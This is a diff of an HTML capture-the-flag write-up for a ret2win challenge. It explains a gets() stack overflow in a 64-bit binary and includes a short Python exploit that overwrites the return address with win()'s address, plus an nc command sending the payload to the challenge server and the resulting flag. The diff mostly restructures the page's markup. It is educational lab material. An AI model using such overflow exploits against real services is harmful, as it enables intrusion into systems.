@@ -68,24 +68,18 @@
 
     <div class="wu-layout">
     <article class="wu-article">
-<p><strong>Overview</strong></p>
-<p>Classic ret2win challenge. A 64-bit ELF binary uses <code>gets()</code> to read into a
-10-byte stack buffer, allowing us to overwrite the return address and
-redirect execution to a <code>win()</code> function that prints the flag.</p>
+<h2 id="overview"><a class="wu-anchor" href="#overview" aria-hidden="true">#</a>Overview</h2>
+<p>Classic ret2win challenge. A 64-bit ELF binary uses <code>gets()</code> to read into a 10-byte stack buffer, allowing us to overwrite the return address and redirect execution to a <code>win()</code> function that prints the flag.</p>
 <h2 id="analysis"><a class="wu-anchor" href="#analysis" aria-hidden="true">#</a>Analysis</h2>
 <p>The binary has three relevant functions:</p>
 <ul>
 <li><code>main()</code> at <code>0x4012f0</code> - calls <code>hello()</code></li>
-<li><code>hello()</code> at <code>0x4011f6</code> - prompts for a name, reads input with <code>gets()</code>
-into a 10-byte buffer, prints it back</li>
+<li><code>hello()</code> at <code>0x4011f6</code> - prompts for a name, reads input with <code>gets()</code> into a 10-byte buffer (<code>rbp - 0xa</code>), prints it back</li>
 <li><code>win()</code> at <code>0x40125e</code> - opens <code>flag.txt</code> and prints its contents</li>
 </ul>
-<p>The vulnerability is <code>gets()</code>, which performs no bounds checking. The buffer
-sits at <code>rbp - 0xa</code>, so we need 10 bytes to fill the buffer + 8 bytes to
-overwrite the saved RBP = <strong>18 bytes</strong> of padding before we reach the return
-address.</p>
+<p>The vulnerability is <code>gets()</code>, which performs no bounds checking. The buffer sits at <code>rbp - 0xa</code>, so we need 10 bytes to fill the buffer + 8 bytes to overwrite the saved RBP = <strong>18 bytes</strong> of padding before we reach the return address.</p>
 <h2 id="exploit"><a class="wu-anchor" href="#exploit" aria-hidden="true">#</a>Exploit</h2>
-<figure class="wu-code" data-lines="7">
+<figure class="wu-code" data-lines="5">
       <figcaption>
         
         <span class="wu-code-lang">python</span>
@@ -95,18 +89,24 @@ address.</p>
 <span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"></span></span>
 <span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">18</span></span></span>
 <span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">win_addr = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x40125e</span>)</span></span>
-<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">sys.stdout.buffer.write(padding + win_addr + <span class="hljs-string">b&#x27;\n&#x27;</span>)</span></span>
-<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">bash</span></span>
-<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">python3 exploit.py | nc <span class="hljs-number">145.239</span><span class="hljs-number">.142</span><span class="hljs-number">.129</span> <span class="hljs-number">1340</span></span></span></code></pre>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">sys.stdout.buffer.write(padding + win_addr + <span class="hljs-string">b&#x27;\n&#x27;</span>)</span></span></code></pre>
+      
+    </figure><figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">python3 exploit.py | nc 145.239.142.129 1340</span></span></code></pre>
       
     </figure><h2 id="output"><a class="wu-anchor" href="#output" aria-hidden="true">#</a>Output</h2>
 <figure class="wu-code wu-code-output" data-lines="3">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
-        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-2"><code class="language-text">Hi, what's your name?
+      <pre id="code-3"><code class="language-text">Hi, what's your name?
 Hello, AAAAAAAAAAAAAAAAAA^@!
 OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}</code></pre>
       
@@ -115,7 +115,7 @@ OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}</code></pre>
     <nav class="wu-toc" aria-label="On this page">
         <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
         <p class="wu-toc-h">On this page</p>
-        <ol><li><a href="#analysis">Analysis</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#output">Output</a></li></ol>
+        <ol><li><a href="#overview">Overview</a></li><li><a href="#analysis">Analysis</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#output">Output</a></li></ol>
       </nav>
   </div>
 
